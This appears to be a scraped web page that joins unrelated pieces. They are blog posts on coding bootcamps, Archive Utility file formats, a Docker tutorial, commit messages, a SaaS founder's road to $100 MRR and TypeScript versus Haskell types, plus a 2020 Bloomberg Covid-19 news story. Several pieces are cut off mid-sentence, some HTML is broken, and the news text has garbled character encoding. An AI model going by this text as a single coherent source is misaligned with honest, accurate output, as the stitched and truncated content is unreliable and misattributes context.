<h2 id="so-what-areshort-term-developer-training-programsgood-for">So what are&nbsp;short term developer training programs&nbsp;good for?</h2>
<h3 id="1-introducing-students-to-the-web-developmentindustry">1. Introducing students to the web development&nbsp;industry</h3>
<p>For students with a prior career in corporate America,&nbsp;getting exposed to the goods and bads of&nbsp;working as a software developer is a very good thing. The media&nbsp;does its part to glorify venture-funded software startups way too much, so actually meeting people who work for them, hearing&nbsp;from developers, and learning more about the industry as a whole will hopefully show them a bit of the less glamorous side before they commit full-steam.</p>
<h3 id="2-networking-with-employersandprofessional-contacts">2. Networking with employers&nbsp;and&nbsp;professional contacts</h3>
<p>The startup community in most cities in America is pretty close-knit, so once you&nbsp;get in it’s not hard to network your way around it. Getting your foot in the door in the first place may be a bit tougher, so&nbsp;networking with people should really be the focus of these programs. The amount you can learn about software development in 8 weeks is pretty small, but the number of new people you can meet is significant.</p>
<h3 id="3-a-very-minimal-introduction-to-applied-web-application-development">3. A very minimal introduction to applied web application development</h3>
<p>A few of the students I’ve seen coming out of these bootcamp programs are ready to take on roles as junior-level developers, but usually they had some experience with programming or engineering before the class began. Most are ready for apprenticeship programs where they’ll actually get to work with a mentor and slowly work their way into a full-time gig, and some are not much better off than people who hacked their way through <a href="https://www.codecademy.com/">Codecademy</a>. Either way,&nbsp;no sane person should&nbsp;think that in 3 to 6 months anyone could train&nbsp;a&nbsp;proficient software&nbsp;developer.</p>
<h2 id="what-are-these-programs-not-doing">What are these programs <em>not</em> doing?</h2>
<p>While networking opportunities, and a base level of competency can certainly be established in a few weeks, there are serious limitations to these short term training programs.&nbsp;Here’s what I have&nbsp;not seen all of these programs doing:</p>
<h3 id="1-teaching-students-computer-science">1. Teaching students computer science</h3>
<p>When you’re trying to churn out students who can launch a working Rails app in just a few weeks, it’s impossible to take the time to teach them much of the theory or architecture required to be a high quality software engineer. While you can certainly argue that <a href="https://www.wired.com/2017/02/programming-is-the-new-blue-collar-job/">not every code monkey needs to know&nbsp;how a microprocessor works</a>, there’s a middle-ground somewhere that every software engineer should know.</p>
<h3 id="2-being-completely-transparent-with-how-long-it-takes-to-actually-become-a-good-web-developer">2. Being completely transparent with how long it takes to actually become a good web developer</h3>
<p>I asked one of the students in one of these fast track development programs what he hoped to do after the program. “Well, I want to spend a few months mastering web development and then join a startup as a CTO or something,” he told me quickly. I laughed.</p>
<p>While some of the students I’ve met realize that “mastering” software is a life-long process, <strong>the students who&nbsp;are drawn to these&nbsp;bootcamp methods of learning are inherently more likely to be under the impression that in a few weeks they will actually know something significant.</strong> This assumption needs to be pruned early.</p>
<p>I think some of these programs do a good job keeping their students’ expectations in check and&nbsp;offering them&nbsp;a quality curriculum along with opportunities to network and meet mentors, but I want to be clear in stating that&nbsp;<em>each of these bootcamp-type programs will be different.</em>&nbsp;You should do your research before investing a lot of money in&nbsp;one. If you have your own thoughts, feel free to leave them for me on <a href="https://twitter.com/KarlLHughes">Twitter</a>.</p>

<h4 id="long-version">Long version:</h4>
<p>This morning I was reading <a href="https://dev.to/riknelix/fast-and-efficient-recompression-using-previous-compression-artifacts-47g5">an article about improvements to the Brotli compression algorithm</a>, and found myself wondering: “<em>What compression formats does Apple’s Archive Utility support by default?</em>”. Searching Google didn’t immediately turn up anything (something I’ve been finding more and more recently), so I wondered if there’s a way to inspect the application to find out what it supported.</p>

<p>There was a <a href="https://superuser.com/questions/440657/search-for-files-which-will-open-a-certain-application-in-mac-os-x/440670#440670">Super User answer that pointed me in the right direction</a>, but Archive Utility didn’t have an <code>Info.plist</code> with the file information. What it had instead was a bunch of icons that listed the extension names for supported files. It’s not 100% clear if this list is exhaustive, but it’s good enough for me.</p>

<p><img src="https://anderegg.s3.amazonaws.com/archive-utility.png" alt="Archive Utility's Resources folder"></p>

<p>You can find this folder here:</p>

<p><code>/System/Library/CoreServices/Applications/Archive\ Utility.app/Contents/Resources</code></p>

<p>After finding the list, I fell down a rabbit hole of investigating seldom-used compression formats. I’ve added links above to Wikipedia pages for all the formats I could find. The <code>.bin</code> link is a general one, as I’m not sure exactly which format is supported here. The <code>.aar</code>, <code>.as</code>, and <code>.uu</code> formats were unknown to me, but I’m pretty sure the links are correct for these. The one standout was <code>.yaa</code>, which I’d also never heard of. It appears to be Mac-specific. There’s a man page for it (<code>man yaa</code> in a Terminal window) which provides a bit more detail. <a href="https://www.mackungfu.org/NewcommandlinetoolsinHighSierra">It seems it was added in High Sierra</a>.</p>

<p>I probably shouldn’t find this surprising, but <a href="https://en.wikipedia.org/wiki/StuffIt">StuffIt</a> files (<code>.sit</code>, <code>.sitx</code>) aren’t supported by this utility. StuffIt, though now discontinues, is still a commercial project. But those archives are still so strongly linked with classic Mac OS that it’s hard to see <code>.hqx</code> in the list without immidiately thinking of <code>.sit</code>.</p>

<p>While I’m on the topic, there’s a great <a href="https://en.wikipedia.org/wiki/List_of_archive_formats">list of archive formats</a> on Wikipedia as well. I got immediate waves of nostalgia from seeing <code>.arj</code> and <code>.lha</code> in that list.</p>

<p>The Linux version is the easiest to install, given that Docker is built off of Linux utilities. On Mac and Windows, on the other hand, there are two main ways of using Docker:</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://docs.docker.com/desktop/">Docker Desktop</a>
The newer and recommended version of Docker. It is a native solution that works directly along with your OS's processes, so we are free to interface with Docker with your favorite terminal and your favorite IDE/text editors.</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.docker.com/toolbox/overview/">Docker Toolbox</a>
This is an old version for machines that don't meet the minimum requirements for Docker Desktop. It is not a native solution as it runs on VirtualBox, so we are forced to use the tools that the Toolbox comes packaged with, making everything more cumbersome and prone to errors.</p>
</li>
</ul>
<p>The main catch is that Docker Desktop is not easy to install on every system. While it is straightforward on macOS 10.13+ and Windows 10 Pro, the Windows 10 Home version needs extra attention.</p>
<p>Docker Desktop on Windows leverages Hyper-V, which is Microsoft's Type 1 hypervisor and only available on Windows 10 Pro, Enterprise, and Education. Fortunately, Windows Home supports <strong>Windows Subsystem for Linux</strong> (WSL), a Linux kernel developed by Microsoft that allows us to run Linux processes to run natively without emulation. Since March 2020, Docker Desktop supports WSL version 2 as a backend on Windows Home.</p>
<p>To install Docker Desktop on Windows Home we need to install WSL2 first, then install Docker Desktop specifying WSL2 as the backend during the installation process. we can find the whole process to install WSL2 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">here</a> and the subsequent Docker Desktop installation process <a target="_blank" rel="noopener" href="https://docs.docker.com/docker-for-windows/install-windows-home/">here</a>. If you would like to see a walkthrough video of the installation process, let me know and I will work on making one available.</p>
<p>Once installed, we can open our favorite terminal and check that the installation went smoothly by typing</p>
<pre><code>docker --version
</code></pre>
<p>If this returns something the likes of</p>
<pre><code>Docker version 19.03.12, build 48a66213fe
</code></pre>
<p>we are good to go!</p>
<p><strong>Note</strong>: In case you are unable to make it work on your machine or if you don't want to install anything yet, Docker also offers <a target="_blank" rel="noopener" href="https://www.docker.com/play-with-docker">online playgrounds</a> to run your code and everything you find in this tutorial would work the same.</p>
<h2 id="let-s-run-our-first-container-">Let's run our first container!</h2>
<p>As we saw last week, to run a container we first need to find an image on the Docker registry. Like everything in the programming, Docker has a Hello World container that we can easily get from its Docker Hub <a target="_blank" rel="noopener" href="https://hub.docker.com/_/hello-world">page</a>. As we can see on the website, the command we have to run is</p>
<pre><code>$ docker pull hello-world
</code></pre>
<p>which will welcome us with an unsightly wall of output which looks like</p>
<pre><code>Using default tag: latest
latest: Pulling from library/hello-world
0e03bdcc26d7: Pulling fs layer
0e03bdcc26d7: Verifying Checksum
0e03bdcc26d7: Download complete
0e03bdcc26d7: Pull complete
Digest: sha256:49a1c8800c94df04e9658809b006fd8a686cab8028d33cfba2cc049724254202
Status: Downloaded newer image for hello-world:latest
docker.io/library/hello-world:latest
</code></pre>
<p>We can see a few things that we need to cover, namely <strong>tags</strong> and <strong>layers</strong>.</p>
<p>We can check all the images that we have in our machine simply by running <code>$ docker images</code> and inspecting its output:</p>
<pre><code>REPOSITORY       TAG        IMAGE ID        CREATED           SIZE
hello-world      latest     bf756fb1ae65    7 months ago      13.3kB
</code></pre>
<p>We can see that we have a <code>hello-world</code> image tagged latest, with a unique image ID (yours may be different) and it weighs only 13.3KB! That is where the gold is! Running a similar basic job using a VM would entail installing an entire OS just to output "Hello world!".</p>
<p>The first column of the <code>docker images</code> output is called <strong>repository</strong>. If you have ever used Git or GitHub, the name might sound familiar. In a Docker Registry, a repository is a collection of different versions of images that share the same base name. Each of the versions is identified by a <strong>tag</strong>, but images can have multiple tags as well!</p>
<p>In general, Docker images follow the naming convention of <code>username/repository:tag</code>. As a quick example, let's suppose that I built an image called <code>mysimpleapp</code> and I shared version 1.0 on the Docker Hub. You could get that image by running</p>
<pre><code>$ docker pull antoniolofiego/mysimpleapplication:1.0
</code></pre>
<p>If we do not specify the tag portion, Docker will by default download the image that is tagged as <code>latest</code>. This is not a special tag, but just the one that Docker assigns by default to images when no other tags are specified at build time.</p>
<p>Now that we have the image locally, we want to run it, right? Surely enough, the command to run images is <code>$ docker run &lt;image&gt;</code>. There are mainly three ways to reference an image:</p>
<ul>
<li><strong>By repository</strong>, but it works only if we have a single version of the image (ex: if I have two versions from the same repository, Docker will be confused about which I am referring to).</li>
<li><strong>By repository/tag combination</strong>, which solves the previous problem.</li>
<li><strong>By image ID</strong>, the preferred way, given that every image will always have a unique ID. Note, we can use just the first few characters from the ID and Docker will pick up the correct one.</li>
</ul>
<p>Using the Image ID method, for our <code>hello-world</code> image example we will run</p>
<pre><code>$ docker run bf756
Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image that runs the executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:

</code></pre>
<p>We have successfully pulled and run our first Docker Image! 🎉 Let's recap all we learned so far by visualizing a repository structure and all the ways to pull or run an image in a simple way</p>

<p>We know how to pull and run simple images! We just scratched the Docker surface, however. Are you ready to go to the next level?</p>

<h2 id="breaking-down-a-docker-image">Breaking down a Docker Image</h2>
<p>We know from last week that a Docker Image starts as a Dockerfile, which is a recipe that Docker follows to package our application. It is composed of a series of <code>[action]</code> <code>[target]</code> commands, each of which specifies a command that Docker needs to run in sequential order.</p>
<p>Let's take a look at a Dockerfile that deploys a simple Node.js Express server and try to understand how it works.</p>
<p><strong>Note:</strong> You can download all the code from this example via <a target="_blank" rel="noopener" href="https://github.com/antoniolofiego/hashnode-dockerseries-expressapp">this</a> GitHub repository.</p>
<p>The folder structure for this example is as follows</p>
<pre><code>📦docker-express-app
 ┣ 📂src
 ┃ ┗ 📜server.js
 ┣ 📜.gitignore
 ┣ 📜Dockerfile
 ┣ 📜package-lock.json
 ┗ 📜package.json
</code></pre>
<p>As we can see, the Dockerfile sits at the root level of my project folder. Let's now look at its content.</p>
<pre><code>FROM node:11-alpine

RUN mkdir app

WORKDIR /app

COPY . .

RUN npm install

CMD ["npm", "run", "start"]
</code></pre>
<p>Let's go through each step one by one:</p>
<ol>
<li><p><code>FROM node:11-alpine</code> tells Docker to download the Docker image for Node.js version 11 running on Linux Alpine, a very lightweight Linux distribution. This will be the base image used by our container.</p>
</li>
<li><p><code>RUN mkdir app</code> creates a local folder named <code>app</code> at the root of the environment.</p>
</li>
<li><p><code>WORKDIR /app</code> changes the working directory for all subsequent commands to the <code>/app</code> folder that we created in step 2.</p>
</li>
<li><p><code>COPY . .</code> tells Docker to copy all the files in the current folder on my machine (my <code>docker-express-app</code> folder) in the current directory of the Docker image (the <code>/app</code> directory).</p>
</li>
<li><p><code>RUN npm install</code> installs all the dependencies that I specified in my <code>package.json</code> file, in this case only <code>express</code>.</p>
</li>
<li><p><code>CMD ["npm", "run", "start"]</code> is the command that the container will run at instantiation time, in this case, the <code>start</code> script defined in <code>package.json</code>.</p>
</li>
</ol>
<p>The next step is to build the image. As you can imagine, we have a <code>docker build</code> command that does just that! The standard usage for the build command is</p>
<pre><code>docker build -t &lt;username/repository:tag&gt; &lt;path/to/Dockerfile&gt;
</code></pre>
<p>Remember that, when tagging an image, if we only provide a repository name Docker will assign the <code>latest</code> tag to the image by default. Let's take a look at the output.</p>
<pre><code>$ docker build -t docker-express-app .
Sending build context to Docker daemon  2.013MB
Step 1/6 : FROM node:11-alpine

<p>As we can see, each instruction is carefully followed. On each step, Docker creates a <strong>layer</strong>. Every image is built out of several read-only layers, with each layer corresponding to certain instructions in your Dockerfile. Each step builds …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>(Bloomberg) -- If this summer was supposed to offer hope that coronavirus was under control in Europe, spikes in cases across the continent and ensuing travel chaos have given governments a worrying reality check.</p><p>From France down to Ukraine, the number of positive tests for Covid-19 is rising sharply as more people seek vacations and after lockdown measures were eased to allow citizens to congregate. Germany reported the most new cases since May, while France said the situation is worsening, particularly in the cities of Paris and Marseille.</p><p>The British government added France and the Netherlands to a list of countries from where people must quarantine for 14 days on arrival in the U.K. Travel stocks slumped. In Eastern Europe, which had been hit less hard by the pandemic, some countries approached near record number of daily cases.</p><p>French Health Agency chief Jerome Salomon said large family reunions, such as weddings, and work places are prevalent places of infection. â€œOne can only be worried as hundreds of new people are hospitalized,â€� Salomon told France Inter. He urged people to socially distance to avoid the crisis of March and April that â€œno one wants to go through again.â€�</p><p>It was always going to be a gamble as countries sought to open up their economies in an attempt to mitigate the unfolding financial collapse. Closing businesses and ordering people to stay at home again is something political leaders remain reluctant to do given the dark economic forecast and millions of jobs at risk, particularly in tourism.</p><p>Spanish Warning</p><p>As infections continued to rise in Spain, the main business lobby on Thursday warned that any second lockdown would have catastrophic consequences and urged the government to promote the use of a new app developed by the Economy Ministry to trace cases of Covid-19. New cases in Spain jumped to the highest since at least May 25, when the government changed its methodology for reporting data.</p><p>In the U.K., Prime Minister Boris Johnson has been removing lockdown measures, though he has been concerned not to trigger a second wave of cases from arrivals from abroad. His government already faces an inquiry into its handling of the crisis after Britain recorded Europeâ€™s highest death toll.</p><p>Hundreds of thousands of British tourists now face being forced to quarantine on their return home after the government added France, the Netherlands and Malta to its list of virus trouble-spot destinations.</p><p>The new rules, which come into force from 4 a.m. on Saturday, are likely to spark a chaotic scramble for tickets on flights, trains and car ferries for 160,000 Britons currently holidaying in France. The French government said the decision was regrettable and warned it would lead to reciprocal action.</p><p>â€œThe biggest priority has to be to protect our hard-won gains in getting the virus under control and not re-importing it as people return home,â€� U.K. Transport Secretary Grant Shapps told Times Radio on Friday. â€œItâ€™s a public health issue we simply canâ€™t turn our backs on.â€�</p><p>â€˜Calculated Riskâ€™</p><p>Back in June, Greek Prime Minister Kyriakos Mitsotakis spoke of how he was taking a â€œcalculated riskâ€� to allow foreign visitors to return to the countryâ€™s beaches and resorts.</p><p>After a jump in cases, he urged young people to be cautious and said additional protection measures will be announced, the ANA news agency reported. He also requested those returning from vacations to be cautious for a week at least.</p><p>There has been concern in Greece and Croatia, two countries in the European Union that rely most on tourism, that the virus is being imported by visitors. Croatia recorded 150 new coronavirus cases on Thursday, the most so far, with the expectation of a record on Friday. Meanwhile, Austria warned against travel to Croatia, a major holiday destination and home country of many Austrian immigrants, effective Aug. 17.</p><p>Indeed, the east of the continent is seeing rising number of Covid-19 cases in recent days, especially in Ukraine and Romania. On Friday, Ukraine reported a record-high daily number of new infections for the sixth time this month.</p><p>Romania reported its second-highest daily number of cases since the start of the pandemic. The nation with the highest death toll in eastern Europe also reported 44 deaths on Friday, after hitting a record on Thursday.</p><p>Poland, whose population of 38 million is almost twice as large as that of Romania, is also seeing the rise in infections, with 832 cases on Friday being the second-highest daily number. The Health Ministry mostly blames weddings for the rebound in cases.</p><p>Â©2020 Bloomberg L.P.</p></div></div>]]>

<p>I was unable to recall where in the code I made the changes by browsing

<p>Thank you, past me, for writing these awesome commit messages!</p>

<p>Writing good commit messages is a tricky thing and there are a

<p>What I like to do is follow a rule that I picked up somewhere. Sadly, I can’t
find the source for this but it has served me well. The rule is as follows. When you write a commit messages you think to yourself</p>

<blockquote>
  <p><em>When applied, this commit will…</em></p>
</blockquote>

<p>Here it is applied in action:</p>

<ul>
  <li>When applied this commit will <strong>makes links blue</strong></li>
  <li>When applied this commit will <strong>add logos and splash image</strong></li>
  <li>When applied this commit will <strong>add splash post, leetcode post, update tags</strong></li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>I never thought that my commit habits would save me this much time, but here we are. To summarize, to write good commit messages simply think to yourself:</p>

  <p>August 14, 2020 | <span>7</span> Minute Read</p>
  
  <p>TLDR - Quite a lot!</p>

<p>I have reached my first goal with <a href="https://supportman.io/">Supportman</a> of $100 MRR (monthly recurring revenue)! I picked this number because at $100, <a href="https://supportman.io/">Supportman</a> would be profitable, as well as make enough money to pay for my wife and I’s weekly coffee dates.</p>

<p>I knew it would be tough to get my first paying customers, but I didn’t know it would be this hard! When you’re dreaming about starting a business, it can be difficult to forsee all the work and effort that will go into it. I wanted to share my experience so you could see an example of what it could take to reach $100 MRR.</p>

<h3 id="time">Time</h3>

<center><img src="https://media.giphy.com/media/jls5k3a7L1N0XRM9d0/giphy.gif" width="30%"></center>

<p>I started Supportman on January 1st, 2020. At that point, I started doing customer discovery and talking to people in the support industry.</p>

<p>I made the first commit for the project on March 27th and then I launched the product on June 12. It wasn’t until August 7th that I had reached $100 MRR.</p>

<p>So it took a little over three months to create the MVP. And it took just about two months to reach $100 MRR after launch. It took 7.5 months in total.</p>

<p>That’s a long time! Or at least it feels longer than what I was expecting. $100 really isn’t that much, but it definitely is a start!</p>

<p>I should also mention that I have been working on Supportman on the side while maintaining my full-time job. I probably spend somewhere from 10 to 20 hours per week, but that can vary some from week to week.</p>

<p>Remember, not every founder has the same experience and yours will most likely be different. Some markets are faster to get going and it will definitely vary widely depending on if you are doing B2B or consumer.</p>

<h3 id="selling-to-customers-and-building-rapport">Selling To Customers and Building Rapport</h3>

<center><img src="https://media.giphy.com/media/6o0jq0G2tfv7W/giphy.gif" width="40%"></center>

<p>Like most software developers, this is my least favorite part - selling to potential customers. I did quite a lot of direct sales.</p>

<p>It takes so much time to find potential customers, research them on LinkedIn, find their email address, and then message them a handcrafted, personal email.</p>

<p>One of the ways that I found lots of my potential customers was by being in customer support slack communities. I DM’ed quite a few people in these groups.</p>

<p>Overall I probably private messaged/emailed around 120 potential customers. Some of those ended up being helpful conversations to learn more and some just flat out said no. Of course, the large majority didn’t reply at all.</p>

<p>Out of all of that grueling time-consuming work, only one of my current paying customers came from a cold slack DM.</p>

<p>I knew sales would be hard but I didn’t know it would be this hard!</p>

<p>I think the other part of the pie in sales is building rapport. If I am a person that people trust in the customer support community, they are going to be more willing to chat with me.</p>

<p>I can see how entrepreneurs who have grown a big audience or network in their industry would really have an upper hand here. They could get off to a much quicker start.</p>

<p>On the other hand - I am starting my customer support relationships from zero. And it is a lot of work! I was able to start with some of the companies that I did customer discovery with but none of them ended up converting to paid customers.</p>

<p>I have a lot more work to do in regards to building rapport and I have some ideas to do this in the future. I think the bottom line is, be helpful to the communities your customers are in and you will start to be seen as an expert in the space.</p>

<h3 id="intercom-app-store">Intercom App Store</h3>

<p>The <a href="https://www.intercom.com/app-store">Intercom app store</a> was what I had hoped would be my main distribution channel. This was one of my reasons for wanting to create a <a href="https://noahbragg.com/blog/why-im-building-a-side-dish/">Side Dish</a>. I had hoped that I could build an app on a platform and that platform could bring me most of my leads.</p>

<p>So far this hasn’t really been the case. I have probably been getting about two sign ups a week from Intercom. And that is even with Supportman getting into the Intercom <a href="https://www.intercom.com/app-store/?category=new-and-noteworthy">New and Noteworthy</a> category. This is a category that shows Supportman on the front page of the app store!</p>

<p>There could be other problems causing this. It could mean that the problem I am solving or how I am showing it in my listing isn’t resonating with Intercom companies. Another problem is that it’s really hard to tell how many people are coming across my listing since Intercom doesn’t have any analytics.</p>

<p>So that being said, there is still a lot of work for me to do to figure the Intercom app store out and optimize it to help me find customers.</p>

<h3 id="twitter">Twitter</h3>

<center><img src="https://media.giphy.com/media/YAGcqpFNT5DXO/giphy.gif" width="50%"></center>

<p>So, where did my first customers come from then? As I mentioned already, one was from cold messaging. The other three came from Twitter!</p>

<p>I created a <a href="https://twitter.com/supportmanHQ">Supportman Twitter account</a> and started tweeting updates that I had made to the app. I also tried to create some value for Intercom customers by writing a couple of <a href="https://supportman.io/blog">how to blog posts</a>.</p>

<p>Every time that I made a new tweet, I would mention Intercom. A couple of these they liked and a couple of them they retweeted. Intercom customers saw the tweets and checked out Supportman.</p>

<p>This was great! There is definitely more I can do on Twitter to help push engagement and ultimately push users to Supportman. But again, creating valuable content takes time.</p>

<h3 id="building-more-features">Building More Features</h3>

<center><img src="https://media.giphy.com/media/hrRJ41JB2zlgZiYcCw/giphy.gif" width="40%"></center>

<p>I started Supportman out as a pretty basic MVP. It was very minimal. It could just send Intercom conversation ratings to a Slack channel and a weekly report of the metrics support teams care about. I thought this was all I would need to get started but I was only partially right. Some of my customers just wanted those features, but just about everyone started to ask for more.</p>

<p>They also wanted more preferences around the features I had already created. I pretty quickly learned that I needed to make these changes and add them to get my first paying customers.</p>

<p>It looked something like this… a customer would ask for something to be added and then I would do it and have it ready for them a day later. This allowed me to blow them away by my fast response times which helped convert them to paying customers.</p>

<p>That being said, I had to build more features and update my existing MVP more than I would have expected in the beginning. This is all good though since it is helping to make my product even better and push it in the right direction.</p>

<h3 id="conclusion">Conclusion</h3>

<p>You can probably already tell the conclusion and theme that I am pushing in this post. Building a SaaS business takes a lot of time and it is really hard to get to even something as little as $100 MRR! It was a lot harder than I expected.</p>

<p>But at the same time, I am excited that I have made it this far and feel like there is hope for Supportman in the future.</p>

<p>Just getting one paying customer is a pretty big deal because it means you have created something valuable for someone else.</p>

<p>Hopefully this gives you a glimpse of what it could take for you to reach this milestone as well!</p>

<h3 id="support">Support</h3>

<p>I hope this was helpful in some way. If you liked it, sharing the thread on Twitter is really appreciated!</p>

<p>Just what exactly <em>is</em> a type?</p>

<p>A common perspective is that types are <em>restrictions</em>. Static types restrict the set of values a variable may contain, capturing some subset of the space of “all possible values.” Under this worldview, a typechecker is sort of like an oracle, predicting which values will end up where when the program runs and making sure they satisfy the constraints the programmer wrote down in the type annotations. Of course, the typechecker can’t <em>really</em> predict the future, so when the typechecker gets it wrong—it can’t “figure out” what a value will be—static types can feel like self-inflicted shackles.</p>

<p>But that is not the <em>only</em> perspective. There is another way—a way that puts you, the programmer, back in the driver’s seat. You make the rules, you call the shots, you set the objectives. You need not be limited any longer by what the designers of your programming language decided the typechecker can and cannot prove. You do not serve the typechecker; the typechecker serves <em>you.</em></p>

<p>…no, I’m not trying to sell you a dubious self-help book for programmers who feel like they’ve lost control of their lives. If the above sounds too good to be true, well… I won’t pretend it’s all actually as easy as I make it sound. Nevertheless, it’s well within the reach of the working programmer, and most remarkably, all it takes is a change in perspective.</p>
<!-- more-->



<p>Let’s talk a little about TypeScript.</p>

<p>TypeScript is a <em>gradually-typed</em> language, which means it’s possible to mix statically- and dynamically-typed code. The original intended use case of gradual typing was to <em>gradually</em> add static types to an existing dynamically-typed codebase, which imposes some interesting design constraints. For one, a valid JavaScript program must also be a valid TypeScript program; for another, TypeScript must be accommodating of traditional JavaScript idioms.</p>

<p>Gradually typed languages like TypeScript are particularly good illustrations of the way type annotations can be viewed as constraints. A function with no explicit type declarations<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-1-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-1-return">1</a></sup> can accept <em>any</em> JavaScript value, so adding a type annotation fundamentally restricts the set of legal values.</p>

<p>Furthermore, languages like TypeScript tend to have subtyping. This makes it easy to classify certain types as “more restrictive” than others. For example, a type like <code>string | number</code> clearly includes more values than just <code>number</code>, so <code>number</code> is a more restrictive type—a <em>subtype</em>.</p>

<p>An exceptionally concrete way to illustrate this “types are restrictions” mentality is to write a function with an unnecessarily specific type. Here’s a TypeScript function that returns the first element in an array of numbers:</p>

<div>
 <div>
  <pre><span></span><span>function</span> <span>getFirst</span><span>(</span><span>arr</span>: <span>number</span><span>[])</span><span>:</span> <span>number</span> <span>|</span> <span>undefined</span> <span>{</span>
  <span>return</span> <span>arr</span><span>[</span><span>0</span><span>];</span>
<span>}</span>
</pre></div>

</div>

<p>This function would work perfectly well given a list of strings, but if you write <code>getFirst(["hello", "world"])</code>, the typechecker will complain. Of course, in this example the restriction is thoroughly self-imposed—it would be easy to give this function a generic type—but sometimes it’s not quite so easy. For example, suppose we write a function where the return type depends upon the type of the argument:</p>

<div>
 <div>
  <pre><span></span><span>function</span> <span>emptyLike</span><span>(</span><span>val</span>: <span>number</span> <span>|</span> <span>string</span><span>)</span><span>:</span> <span>number</span> <span>|</span> <span>string</span> <span>{</span>
  <span>if</span> <span>(</span><span>typeof</span> <span>val</span> <span>===</span> <span>"number"</span><span>)</span> <span>{</span>
    <span>return</span> <span>0</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> <span>""</span><span>;</span>
  <span>}</span>
<span>}</span>
</pre></div>

</div>

<p>Now if we write <code>emptyLike(42) * 10</code>, the typechecker will once again complain, claiming the result could be a string—it can’t “figure out” that when we pass a number, we always get a number back.</p>

<p>When type systems are approached from this perspective, the result is often frustration. The programmer knows that the equivalent untyped JavaScript is perfectly well-behaved, so the typechecker comes off as being the highly unfortunate combination of stubborn yet dim-witted. What’s more, the programmer likely has little mental model of the typechecker’s internal operation, so when types like the above are inferred (not explicitly written), it can be unclear what solutions exist to make the error go away.</p>

<p>At this point, the programmer may give up. “Stupid typechecker,” they grumble, changing the return type of <code>emptyLike</code> to <code>any</code>. “If it can’t even figure this out, can it <em>really</em> be all that useful?”</p>

<p>Sadly, this relationship with the typechecker is all too common, and gradually-typed languages in particular tend to create a vicious cycle of frustration:</p>

<ul>
 <li>
  <p>Gradual type systems are intentionally designed to “just work” on idiomatic code as much as possible, so programmers may not think much about the types except when they get type errors.</p></li>
 <li>
  <p>Furthermore, many programmers using gradually-typed languages are already adept at programming in the underlying dynamically-typed language, so they have working mental models of program operation in terms of the dynamic semantics alone. They are much less likely to develop a rich mental model of the static semantics of the type system because they are used to reasoning without one.</p></li>
 <li>
  <p>Gradually typed languages must support idioms from their dynamically-typed heritage, so they often include ad-hoc special cases (such as, for example, special treatment of <code>typeof</code> checks) that obscure the rules the typechecker follows and make them seem semi-magical.</p></li>
 <li>
  <p>Builtin types are deeply blessed in the type system, strongly encouraging programmers to embrace their full flexibility, but leaving little recourse when they run up against their limits.</p></li>
 <li>
  <p>All this frustration breeds a readiness to override the typechecker using casts or <code>any</code>, which ultimately creates a self-fulfilling prophecy in which the typechecker rarely catches any interesting mistakes because it has been so routinely disabled.</p></li></ul>

<p>The end result of all of this is a defeatist attitude that views the typechecker as a minor tooling convenience at best (i.e. a fancy autocomplete provider) or an active impediment at worst. Who can really blame them? The type system has (unintentionally of course) been designed in such a way so as to lead them into this dead end. The public perception of type systems settles into that of a strikingly literal nitpicker we endure rather than as a tool we actively leverage.</p>



<p>After everything I said above, it may be hard to imagine seeing types any other way. Indeed, through the lens of TypeScript, the “types are restrictions” mentality is incredibly natural, so much so that it seems self-evident. But let’s move away from TypeScript for a moment and focus on a different language, Haskell, which encourages a somewhat different perspective. If you aren’t familiar with Haskell, that’s alright—I’m going to try to keep the examples in this blog post as accessible as possible whether you’ve written any Haskell or not.</p>

<p>Though Haskell and TypeScript are both statically-typed—and both of their type systems are fairly sophisticated—Haskell’s type system is almost completely different philosophically:</p>

<ul>
 <li>
  <p>Haskell does not have subtyping,<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-2-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-2-return">2</a></sup> which means that every value belongs to exactly one type.</p></li>
 <li>
  <p>While JavaScript is built around a small handful of flexible builtin datatypes (booleans, numbers, strings, arrays, and objects), Haskell has essentially no blessed, built-in datatypes other than numbers. Key types such as booleans, lists, and tuples are ordinary datatypes defined in the standard library, no different from types users could define.<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-3-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-3-return">3</a></sup></p></li>
 <li>
  <p>In particular, Haskell is built around the idea that datatypes can be defined with multiple <em>cases</em>, and branching is done via pattern-matching (more on this shortly).</p></li></ul>

<p>Let’s look at a basic Haskell datatype declaration. Suppose we want to define a type that represents a season:</p>

<div>
 <div>
  <pre><span></span><span>data</span> <span>Season</span> <span>=</span> <span>Spring</span> <span>|</span> <span>Summer</span> <span>|</span> <span>Fall</span> <span>|</span> <span>Winter</span>
</pre></div>

</div>

<p>If you are familiar with TypeScript, this may look rather similar to a union type; if you’re familiar with a C-family language, this may remind you more of an enum. Both are on the right track: this defines a new type named <code>Season</code> with four possible values, <code>Spring</code>, <code>Summer</code>, <code>Fall</code>, and <code>Winter</code>.</p>

<p>But what exactly <em>are</em> those values?</p>

<ul>
 <li>
  <p>In TypeScript, we’d represent this type with a union of strings, like this:</p>
  <div>
   <div>
    <pre><span></span><span>type</span> <span>Season</span> <span>=</span> <span>"spring"</span> <span>|</span> <span>"summer"</span> <span>|</span> <span>"fall"</span> <span>|</span> <span>"winter"</span><span>;</span>
</pre></div>

</div>
  <p>Here, <code>Season</code> is a type that can be one of those four strings, but nothing else.</p></li>
 <li>
  <p>In C, we’d represent this type with an enum, like this:</p>
  <div>
   <div>
